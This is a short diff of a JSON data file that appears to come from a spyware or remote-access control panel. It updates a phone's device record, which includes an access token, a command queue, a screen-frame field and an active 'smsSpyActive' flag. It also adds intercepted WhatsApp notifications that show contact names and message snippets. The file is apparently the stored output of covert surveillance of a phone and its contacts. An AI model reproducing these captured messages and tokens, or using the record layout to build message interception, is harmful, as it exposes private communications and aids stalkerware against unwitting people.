@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777241259817,
+    "lastSeen": 1777241292791,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Senam Rappocini: ~ Elhä",
+        "content": "💟 Stiker",
+        "time": "27/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777241262804
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎5 pesan dari 3 chat",
+        "time": "27/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777241262516
+      },
       {
         "appName": "WhatsApp",
         "sender": "Bahasa Indonesia 8.10: ~ Adhe Utami Lestari",
